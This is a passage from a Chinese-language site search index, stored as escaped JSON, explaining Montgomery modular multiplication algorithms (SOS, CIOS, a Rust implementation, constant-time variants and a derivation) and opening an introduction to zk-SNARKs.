\u200b\u4f4d\u5168\u200b\u662f\u200b 0\uff0c\u200b\u4e5f\u200b\u610f\u5473\u7740\u200b\u5b9e\u9645\u4e0a\u200b \\((T + m_1N) * N'\\) \u200b\u5c31\u662f\u200b\u62ff\u200b \\((T + m_1N) \\bmod 2^{2w}\\) \u200b\u7684\u200b\u9ad8\u200b \\(w\\) \u200b\u4f4d\u200b\u4e58\u4ee5\u200b \\(N'\\) \u200b\u7684\u200b\u4f4e\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u518d\u200b\u5de6\u79fb\u200b \\(w\\) \u200b\u4f4d\u200b\uff0c\u200b\u7ed3\u679c\u200b\u7b49\u4e8e\u200b \\(m_2 * 2 ^ w\\)\uff0c\u200b\u6240\u4ee5\u200b \\(m_2\\) \u200b\u5c31\u200b\u7b49\u4e8e\u200b \\(((T+m_1N) \\bmod 2^{2w}) / 2^w * (N' \\bmod 2^w)\\)\uff0c\u200b\u5bf9\u5e94\u200b\u5728\u200b\u4ee3\u7801\u200b\u4e0a\u200b\uff0c\u200b\u5c31\u662f\u200b <code>m_2 = t[1] * n'[0]</code>\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u53ef\u4ee5\u200b\u4e00\u76f4\u200b\u7ee7\u7eed\u4e0b\u53bb\u200b\uff0c\u200b\u6bcf\u200b\u4e00\u6b65\u200b\u7684\u200b <code>m_i</code> \u200b\u90fd\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>m_i = t[i] * n'[0]</code> \u200b\u8ba1\u7b97\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e0d\u518d\u200b\u9700\u8981\u200b\u5148\u6c42\u200b \\(m\\)\uff0c\u200b\u518d\u6c42\u200b \\(T + mN\\)\uff0c\u200b\u800c\u662f\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8ba1\u7b97\u200b\uff1a</p> <pre><code># t += m * N\nfor i=0 to s-1\n    C := 0\n    # W = 2^w\n    m := t[i] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[i+j] + m*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n</code></pre> <p>\u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(T + mN\\) \u200b\u4ee5\u540e\u200b\uff0c\u200b\u6700\u540e\u200b\u5c31\u662f\u200b\u9664\u4ee5\u200b \\(R\\) \u200b\u4e86\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u4e5f\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u76f4\u63a5\u200b\u53bb\u6389\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u7684\u200b\u4f4e\u200b \\(s\\) \u200b\u9879\u200b\u5373\u53ef\u200b\uff1a</p> <pre><code># u = t / R\nfor i=0 to s\n    u[j] := t[j+s]\n</code></pre> <p>\u200b\u6700\u540e\u200b\u518d\u7528\u200b\u5927\u200b\u6574\u6570\u200b\u51cf\u6cd5\u200b\u548c\u200b\u6bd4\u8f83\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u7ed3\u679c\u200b \\(u\\) \u200b\u843d\u200b\u5728\u200b \\([0, N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u4e0d\u200b\u5355\u72ec\u200b\u5217\u200b\u4ee3\u7801\u200b\u4e86\u200b\u3002\u200b\u628a\u200b\u4e0a\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\u5408\u5728\u4e00\u8d77\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u6700\u7ec8\u200b\u5b8c\u6574\u200b Separated Operand Scanning \u200b\u7b97\u6cd5\u200b\u7684\u200b\u4f2a\u200b\u4ee3\u7801\u200b\uff1a</p> <pre><code># t = a * b\nfor i=0 to s-1\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[i+j] + a[j]*b[i] + C\n        t[i+j] := S\n    t[i+s] := C\n\n# t += m * N\nfor i=0 to s-1\n    C := 0\n    # W = 2^w\n    m := t[i] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[i+j] + m*n[j] + C\n        t[i+j] := S\n    ADD (t[i+s], C)\n\n# u = t / R\nfor i=0 to s\n    u[j] := t[j+s]\n\n# return u or u - N\nB := 0\nfor i=0 to s-1\n    (B,D) := u[i] - n[i] - B\n    t[i] := D\n(B,D) := u[s] - B\nt[s] := D\nif B=0 then\n    return t[0], t[1], ... , t[s-1]\nelse\n    return u[0], u[1], ... , u[s-1]\n</code></pre>"},{"location":"cryptography/montgomery_mul_mod.html#coarse-integrated-operand-scanning","title":"Coarse Integrated Operand Scanning","text":"<p>\u200b\u7b2c\u4e8c\u79cd\u200b\u7b97\u6cd5\u200b Coarse Integrated Operand Scanning \u200b\u662f\u200b\u5728\u200b Separated Operand Scanning \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u628a\u200b \\(a*b\\) \u200b\u548c\u200b\u540e\u9762\u200b\u7684\u200b\u8ba1\u7b97\u200b\u8fc7\u7a0b\u200b\u4ea4\u9519\u200b\u8fdb\u884c\u200b\uff0c\u200b\u653e\u5728\u200b\u540c\u4e00\u4e2a\u200b\u5927\u200b\u5faa\u73af\u200b\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u540e\u9762\u200b\u4f7f\u7528\u200b\u5230\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u4f9d\u8d56\u200b\u5df2\u7ecf\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u90e8\u5206\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u7ed3\u675f\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u628a\u200b\u6574\u4e2a\u200b <code>t</code> \u200b\u6570\u7ec4\u200b\u53f3\u79fb\u200b\u4e00\u6b21\u200b\uff0c\u200b\u56e0\u6b64\u200b\u539f\u6765\u200b\u7684\u200b <code>t[i]</code> \u200b\u5c31\u200b\u4f1a\u200b\u53d8\u6210\u200b <code>t[0]</code>\uff0c<code>t[i+j]</code> \u200b\u53d8\u6210\u200b <code>t[j]</code>\u3002</p> <pre><code>for i=0 to s-1\n\n    # t = a * b\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[j] + a[j]*b[i] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := C\n\n    # t += m * N\n    C := 0\n    # W = 2^w\n    m := t[0] * n'[0] mod W\n    for j=0 to s-1\n        (C, S) := t[j] + m*n[j] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := t[s+1] + C\n\n    # t /= W\n    for j=0 to s\n        t[j] := t[j+1]\n\n# return t or t - N\n# save as above, omitted\n</code></pre> <p>\u200b\u6bcf\u6b21\u200b\u5faa\u73af\u200b\u90fd\u200b\u53f3\u79fb\u200b\u4e00\u6b21\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5faa\u73af\u200b \\(s\\) \u200b\u6b21\u200b\u5c31\u662f\u200b\u9664\u4ee5\u200b \\(R\\)\uff0c\u200b\u56e0\u6b64\u200b\u539f\u6765\u200b\u7684\u200b \\(u = t / R\\) \u200b\u4e00\u6b65\u200b\u5c31\u200b\u4e0d\u200b\u9700\u8981\u200b\u4e86\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\\(t\\) \u200b\u6570\u7ec4\u200b\u9700\u8981\u200b\u7684\u200b\u5b58\u50a8\u7a7a\u95f4\u200b\u4e5f\u200b\u7f29\u5c0f\u200b\u4e86\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u5b8c\u6574\u200b\u7684\u200b \\(a*b\\) \u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u628a\u200b <code>t += m * N</code> \u200b\u548c\u200b\u79fb\u4f4d\u200b\u4e24\u6b65\u200b\u5408\u5e76\u200b\u5728\u200b\u4e00\u8d77\u200b\u8fdb\u884c\u200b\uff1a</p> <pre><code>for i=0 to s-1\n\n    # t = a * b\n    C := 0\n    for j=0 to s-1\n        (C, S) := t[j] + a[j]*b[i] + C\n        t[j] := S\n    (C, S) := t[s] + C\n    t[s] := S\n    t[s+1] := C\n\n    # t = (t + m * N) / W\n    # W = 2^w\n    m := t[0] * n'[0] mod W\n    (C, S) := t[0] + m*n[0]\n    for j=1 to s-1\n        (C, S) := t[j] + m*n[j] + C\n        t[j-1] := S\n    (C, S) := t[s] + C\n    t[s-1] := S\n    t[s] := t[s+1] + C\n\n# return t or t - N\n# save as above, omitted\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u6700\u7ec8\u200b\u7684\u200b Coarse Integrated Operand Scanning \u200b\u7b97\u6cd5\u200b\uff0c\u200b\u4e0b\u9762\u200b\u662f\u200b\u4e00\u6bb5\u200b\u7528\u200b Rust \u200b\u8bed\u8a00\u200b\u7f16\u5199\u200b\u7684\u200b\u5b9e\u73b0\u200b\uff1a</p> <pre><code>// https://github.com/jiegec/rust-monty-comparison/blob/6c941d5c95d37dd9ee8f12aa57df577e0f2b623b/src/lib.rs#L89-L139\nlet mut res = [0u32; WORDS + 2];\n// for i=0 to s-1\nfor i in 0..WORDS {\n    // C := 0\n    let mut c = 0;\n    // for j = 0 to s-1\n    for j in 0..WORDS {\n        // (C, S) := t[j] + a[j] * b[i] + C\n        let mut cs = res[j] as u64;\n        cs += self.num[j] as u64 * other.num[i] as u64;\n        cs += c as u64;\n        c = (cs &gt;&gt; 32) as u32;\n        // t[j] := S\n        res[j] = cs as u32;\n    }\n    // (C, S) := t[s] + C\n    let cs = res[WORDS] as u64 + c as u64;\n    // t[s] := S\n    res[WORDS] = cs as u32;\n    // t[s+1] := C\n    res[WORDS + 1] = (cs &gt;&gt; 32) as u32;\n\n    // m := t[0]*n'[0] mod W\n    let m: u32 = (res[0] as u64 * N_INV as u64) as u32;\n    // (C, S) := t[0] + m*n[0]\n    let mut cs = res[0] as u64 + m as u64 * N[0] as u64;\n    c = (cs &gt;&gt; 32) as u32;\n    // for j=1 to s-1\n    for j in 1..WORDS {\n        // (C, S) := t[j] + m*n[j] + C\n        cs = res[j] as u64;\n        cs += m as u64 * N[j] as u64;\n        cs += c as u64;\n        c = (cs &gt;&gt; 32) as u32;\n        // t[j-1] := S\n        res[j - 1] = cs as u32;\n    }\n    // (C, S) := t[s] + C\n    cs = res[WORDS] as u64 + c as u64;\n    // t[s-1] := S\n    res[WORDS - 1] = cs as u32;\n    // t[s] := t[s+1] + C\n    res[WORDS] = res[WORDS + 1] + (cs &gt;&gt; 32) as u32;\n}\n\nlet res_scalar = MontyBigNum::from_u32_slice(&amp;res[0..WORDS]);\nlet mut res_scalar_sub = res_scalar;\nlet borrow = bignum_sub(&amp;mut res_scalar_sub, &amp;MODULO);\nif res[WORDS] != 0 || borrow == 0 {\n    res_scalar_sub\n} else {\n    res_scalar\n}\n</code></pre> <p>OpenSSL \u200b\u4e5f\u200b\u5728\u200b\u51fd\u6570\u200b bn_mul_mont \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u8fd9\u4e2a\u200b\u7b97\u6cd5\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_5","title":"\u5e38\u6570\u200b\u65f6\u95f4","text":"<p>\u200b\u5728\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\uff0c\u200b\u9700\u8981\u200b\u628a\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u7136\u540e\u200b\u8fdb\u884c\u200b\u51cf\u6cd5\u200b\uff0c\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u4e2a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\u548c\u200b\u6570\u636e\u200b\u76f8\u5173\u200b\uff0c\u200b\u6210\u4e3a\u200b\u4e00\u4e2a\u200b\u6f5c\u5728\u200b\u7684\u200b\u6d4b\u200b\u4fe1\u9053\u200b\u653b\u51fb\u200b\u7684\u200b\u70b9\u200b\u3002\u200b\u56e0\u6b64\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u5982\u4e0b\u200b\u7684\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\uff08\u200b\u53c2\u8003\u200b\u8bba\u6587\u200b Montgomery Arithmetic from a Software Perspective\uff09\uff1a</p> <p>\u200b\u65e2\u7136\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u662f\u200b\u4e3a\u4e86\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u90a3\u200b\u5982\u679c\u200b\u53bb\u6389\u200b\u8fd9\u4e2a\u200b\u9650\u5236\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u800c\u200b\u4e0d\u662f\u200b \\([0, N-1]\\)\uff0c\u200b\u770b\u770b\u200b\u80fd\u5426\u200b\u7ee7\u7eed\u200b\u628a\u200b\u7ed3\u679c\u200b\u4f20\u7ed9\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002\u200b\u9996\u5148\u200b\u8981\u6c42\u200b \\(R &gt; 2N\\)\uff0c\u200b\u56e0\u4e3a\u200b\u8f93\u5165\u200b\u53c2\u6570\u200b\u7684\u200b\u8303\u56f4\u200b\u662f\u6a21\u200b \\(2N\\)\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u6a21\u200b \\(N\\)\uff1b\u200b\u5176\u6b21\u200b\uff0c\u200b\u91cd\u65b0\u8003\u8651\u200b \\(t = (T+mN) / R\\) \u200b\u7684\u200b\u653e\u7f29\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((2N-1)(2N-1) + (R-1)N) / R \\end{align}\\] <p>\u200b\u6b64\u65f6\u200b\u4e3a\u4e86\u200b\u8ba9\u200b \\(t &lt; 2N\\) \u200b\u6210\u7acb\u200b\uff0c\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u6dfb\u52a0\u200b\u6761\u4ef6\u200b \\(R &gt; 4N\\)\uff0c\u200b\u6b64\u65f6\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((2N-1)(2N-1) + (R-1)N) / R \\\\ &amp;&lt; ((\\frac{1}{2}R)(2N) + RN) / R \\\\ &amp;= N + N \\\\ &amp;= 2N \\end{align}\\] <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u89c4\u5b9a\u200b \\(R &gt; 4N\\)\uff0c\u200b\u90a3\u4e48\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u53ef\u4ee5\u200b\u4e0d\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u628a\u200b\u7ed3\u679c\u200b\u4fdd\u7559\u200b\u5728\u200b \\([0, 2N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\uff0c\u200b\u7ee7\u7eed\u200b\u8fdb\u884c\u200b\u540e\u7eed\u200b\u7684\u200b Montgomery \u200b\u6a21\u4e58\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u6837\u200b\u6709\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff0c\u200b\u5c31\u662f\u200b\u5728\u200b RSA \u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u901a\u5e38\u200b \\(N\\) \u200b\u7684\u200b\u4f4d\u6570\u200b\u5c31\u662f\u200b\u4e8c\u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(N\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b 2048 \u200b\u4f4d\u200b\u7684\u200b\u5927\u200b\u6574\u6570\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6ee1\u8db3\u200b \\(R &gt; 4N\\)\uff0c\u200b\u4e0d\u5f97\u4e0d\u200b\u591a\u5b58\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b\uff0c\u200b\u76f8\u5e94\u200b\u5730\u200b Montgomery \u200b\u6a21\u4e58\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\u7684\u200b\u5faa\u73af\u200b\u6b21\u6570\u200b\u4e5f\u200b\u8981\u200b\u589e\u52a0\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u65e2\u7136\u200b\u548c\u200b \\(N\\) \u200b\u6bd4\u8f83\u200b\u6bd4\u8f83\u200b\u8d39\u65f6\u95f4\u200b\uff0c\u200b\u800c\u4e14\u200b\u9700\u8981\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u6539\u6210\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\uff0c\u200b\u8ba9\u200b\u7ed3\u679c\u200b\u4fdd\u6301\u200b\u5728\u200b \\([0, R-1]\\) \u200b\u7684\u200b\u533a\u95f4\u200b\u5185\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u539f\u6765\u200b\u7684\u200b \\([0, N-1]\\) \u200b\u533a\u95f4\u200b\u3002\u200b\u6b64\u65f6\u200b\u91cd\u65b0\u8003\u8651\u200b \\(t = (T+mN) / R\\) \u200b\u7684\u200b\u653e\u7f29\u200b\uff1a</p> \\[\\begin{align} t &amp;= (T+mN) / R \\\\ &amp;= (ab + mN) / R \\\\ &amp;\\le ((R-1)(R-1) + (R-1)N) / R \\\\ &amp;&lt; (R^2 + RN) / R \\\\ &amp;= R + N \\end{align}\\] <p>\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u7ed3\u679c\u200b\u4f1a\u200b\u5728\u200b \\([0, R+N-1]\\) \u200b\u7684\u200b\u8303\u56f4\u200b\u5185\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6700\u540e\u200b\u4e00\u6b65\u200b\u53d8\u6210\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\u5927\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u6bd4\u200b \\(R\\) \u200b\u5927\u200b\uff0c\u200b\u5c31\u200b\u51cf\u53bb\u200b \\(N\\)\u3002\u200b\u548c\u200b \\(R\\) \u200b\u6bd4\u8f83\u200b\u5927\u5c0f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u76f4\u63a5\u200b\u770b\u200b\u6700\u9ad8\u200b\u4f4d\u200b\u662f\u5426\u200b\u4e3a\u200b \\(0\\) \u200b\u5373\u53ef\u200b\u3002\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u5e76\u200b\u6ca1\u6709\u200b\u6d88\u9664\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff0c\u200b\u4f46\u662f\u200b\u628a\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u7684\u200b\u5f00\u9500\u200b\u964d\u5230\u200b\u4e86\u200b\u5355\u6b21\u200b\u6574\u6570\u200b\u6bd4\u8f83\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u5e38\u6570\u200b\u65f6\u95f4\u200b\u7684\u8bdd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u7ed3\u679c\u200b\u5c0f\u4e8e\u200b \\(R\\) \u200b\u65f6\u200b\uff0c\u200b\u51cf\u53bb\u200b\u96f6\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_6","title":"\u9006\u200b\u63a8","text":"<p>\u200b\u4e0b\u9762\u200b\u5c1d\u8bd5\u200b\u9006\u200b\u63a8\u51fa\u200b Montgomery \u200b\u662f\u200b\u5982\u4f55\u200b\u8bbe\u8ba1\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7b97\u6cd5\u200b\u7684\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u76ee\u6807\u200b\u662f\u200b\u6c42\u200b \\(t = a * b \\bmod N\\)\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u8981\u200b\u627e\u5230\u200b\u4e00\u4e2a\u200b \\(m\\) \u200b\u6ee1\u8db3\u200b \\(t = a * b + mN \\in [0, N-1]\\)\uff0c\u200b\u4f46\u662f\u200b\u6c42\u200b \\(m\\) \u200b\u7684\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b\u9664\u6cd5\u200b\u3002\u200b\u65e2\u7136\u200b \\(N\\) \u200b\u4e0d\u200b\u65b9\u4fbf\u200b\u8ba1\u7b97\u200b\u9664\u6cd5\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5c1d\u8bd5\u200b\u6362\u200b\u4e00\u4e2a\u200b\u9664\u6570\u200b \\(R\\)\uff0c\u200b\u628a\u200b\u95ee\u9898\u200b\u8f6c\u5316\u200b\u4e3a\u6c42\u200b \\(m\\) \u200b\u4f7f\u5f97\u200b \\(t = (a * b + mN) / R \\in [0, N-1]\\)\uff0c\u200b\u6b64\u65f6\u200b \\(t = a * b * R^{-1} \\bmod N\\)\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u8981\u7d27\u200b\uff0c\u200b\u53ea\u8981\u200b\u80fd\u200b\u9ad8\u6548\u200b\u5730\u200b\u8ba1\u7b97\u200b \\(a * b * R^{-1} \\bmod N\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9ad8\u6548\u200b\u5730\u200b\u8ba1\u7b97\u200b \\(a * b \\bmod N\\)\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u4e0b\u9762\u200b\u7684\u200b\u95ee\u9898\u200b\u5c31\u200b\u6765\u5230\u200b\u4e86\u200b\u600e\u4e48\u200b\u627e\u5230\u200b \\(m\\) \u200b\u4f7f\u5f97\u200b \\(t = (a * b + mN) / R \\in [0, N-1]\\)\u3002\u200b\u628a\u200b \\(R\\) \u200b\u632a\u5230\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\uff0c\u200b\u5f97\u5230\u200b</p> \\[ t * R = a * b + m * N \\] <p>\u200b\u7531\u4e8e\u200b \\(t\\) \u200b\u672a\u77e5\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7b49\u5f0f\u200b\u5de6\u8fb9\u200b\u7684\u200b\u503c\u200b\u672a\u77e5\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d88\u9664\u200b\u672a\u77e5\u6570\u200b\uff0c\u200b\u7b49\u5f0f\u200b\u4e24\u8fb9\u200b\u540c\u65f6\u200b\u5bf9\u200b \\(R\\) \u200b\u53d6\u4f59\u200b\uff1a</p> \\[ 0 \\equiv a * b + m * N \\pmod R \\] <p>\u200b\u4e8e\u662f\u200b \\(m \\equiv - a * b * N^{-1} \\pmod R\\)\uff0c\u200b\u5176\u4e2d\u200b \\(-N^{-1} \\bmod R\\) \u200b\u7684\u200b\u90e8\u5206\u200b\u53ef\u4ee5\u200b\u9884\u5148\u200b\u8ba1\u7b97\u200b\u597d\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u91cc\u200b\u4f9d\u7136\u200b\u662f\u200b\u5728\u200b\u6a21\u200b \\(R\\) \u200b\u7684\u200b\u610f\u4e49\u200b\u4e0b\u200b\u76f8\u7b49\u200b\uff0c\\(m\\) \u200b\u6709\u200b\u591a\u79cd\u200b\u53ef\u80fd\u200b\u3002</p> <p>\u200b\u5f88\u200b\u5e78\u8fd0\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u63a8\u5bfc\u200b\u8fc7\u200b\uff0c\u200b\u5f53\u200b \\(m = ((a * b) \\bmod R * -N^{-1}) \\bmod R\\) \u200b\u65f6\u200b\uff0c\u200b\u6070\u597d\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u6700\u7ec8\u200b\u7ed3\u679c\u200b \\(t \\in [0, 2N-1]\\)\uff0c\u200b\u6b64\u65f6\u200b\u53ea\u200b\u9700\u8981\u200b\u7b80\u5355\u200b\u5224\u65ad\u200b\u4e00\u4e0b\u200b \\(t\\) \u200b\u548c\u200b \\(N\\) \u200b\u7684\u200b\u5927\u5c0f\u200b\u5173\u7cfb\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6c42\u200b\u51fa\u200b\u7b54\u6848\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u628a\u200b Montgomery \u200b\u6a21\u4e58\u200b\u7684\u200b\u6d41\u7a0b\u200b\u9006\u200b\u63a8\u51fa\u200b\u6765\u200b\u4e86\u200b\u3002</p> <p>\u200b\u6240\u4ee5\u200b\u4e24\u70b9\u200b\u89c2\u5bdf\u200b\u5f88\u200b\u91cd\u8981\u200b\uff1a\u200b\u4e00\u662f\u200b\u6362\u200b\u4e00\u4e2a\u200b\u5bb9\u6613\u200b\u505a\u200b\u9664\u6cd5\u200b\u7684\u200b\u9664\u6570\u200b \\(R\\)\uff0c\u200b\u60f3\u5230\u200b\u8981\u8bbe\u200b \\(t = (a * b + mN) / R\\)\uff1b\u200b\u4e8c\u662f\u200b\u5373\u4f7f\u200b\u8ba9\u200b\u6a21\u4e58\u200b\u52a0\u4e0a\u200b\u4e00\u4e2a\u200b\u7cfb\u6570\u200b \\(R^{-1}\\)\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u59a8\u788d\u200b\u5b83\u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"cryptography/montgomery_mul_mod.html#_7","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Wikipedia</li> <li>Analyzing and Comparing Montgomery Multiplication Algorithms</li> </ul>"},{"location":"cryptography/zk_snark.html","title":"zk-SNARK","text":"<p>zk-SNARK \u200b\u5168\u540d\u662f\u200b zero knowledge Succinct Non-interactive ARgument of Knowledge\uff0c\u200b\u662f\u200b\u4e00\u79cd\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u7279\u70b9\u200b\u662f\u200b\u7b80\u660e\u200b\uff08Succinct\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u9700\u8981\u200b\u7684\u200b\u4fe1\u606f\u91cf\u200b\u6bd4\u8f83\u200b\u5c11\u200b\uff1b\u200b\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\uff08Non-interactive\uff09\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e0d\u200b\u9700\u8981\u200b\u8bc1\u660e\u200b\u8005\u200b\u548c\u200b\u9a8c\u8bc1\u200b\u8005\u200b\u4e4b\u95f4\u200b\u8fdb\u884c\u200b\u591a\u6b21\u200b\u7684\u200b\u4ea4\u4e92\u200b\u3002</p> <p>\u200b\u672c\u6587\u200b\u57fa\u672c\u200b\u6309\u7167\u200b Why and How zk-SNARK Works: Definitive Explanation \u200b\u7684\u200b\u601d\u8def\u200b\u53bb\u200b\u63a2\u8ba8\u200b zk-SNARK \u200b\u7684\u200b\u539f\u7406\u200b\u548c\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u6587\u4e2d\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e5f\u200b\u53c2\u8003\u200b\u4e86\u200b\u8be5\u200b\u6587\u7ae0\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_1","title":"\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e","text":"<p>\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\uff0c\u200b\u73b0\u5728\u200b\u6709\u200b\u4e00\u4e2a\u200b Prover \u200b\u548c\u200b\u4e00\u4e2a\u200b Verifier\uff0cProver \u200b\u53ef\u4ee5\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u67d0\u4ef6\u4e8b\u200b\u60c5\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u80fd\u200b\u8ba9\u200b Verifier \u200b\u77e5\u9053\u200b\u9690\u85cf\u200b\u7684\u200b\u79d8\u5bc6\u200b\u3002\u200b\u4f8b\u5982\u200b Prover 